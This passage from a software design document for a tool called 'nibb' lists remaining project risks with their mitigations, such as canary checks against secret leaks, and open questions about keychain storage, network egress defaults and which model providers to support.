| 8 | L1 false positives make the daily driver annoying | Allowlist; per-class tuning on nibb's own repo; confirmed events feed L3 |
| 9 | Secret leaks via an unexpected path (error, panic, debug print) | Canary-grep post-condition in every exfil scenario; handles print opaque; keychain value type has no `String()` |
| 10 | Single developer, hard deadline | Phase gates with promotion; cut order defined |

---

## 9. Open questions

Resolved: module path is `github.com/fclaude/nibb`; no Scheme interpreter exists — B1 writes a minimal, documented subset from scratch (ADR 7).

Still open (answer before the phase that needs them):

3. **Where does `nibb-stable` live** — `~/.local/bin` (planned) or inside the repo, gitignored?
4. **Keychain backend** — passphrase file (planned) or macOS Keychain from day one?
5. **Policy default for unbound egress** — Deny (planned) or Confirm?
6. **Jev credential** — bound data-plane credential (planned) or control-plane standing?
7. **Anthropic / frontier providers in v0 at all?** Planned as "optional in P3, decide on friction.md evidence". If the answer is "never in v0", `nibb-control` and the Anthropic provider are dropped from the plan.
8. **Ollama version drift** — the live server is 0.34.2 while the compose file pins 0.34.0 by digest. Not a nibb problem, but worth a note in `infra`.
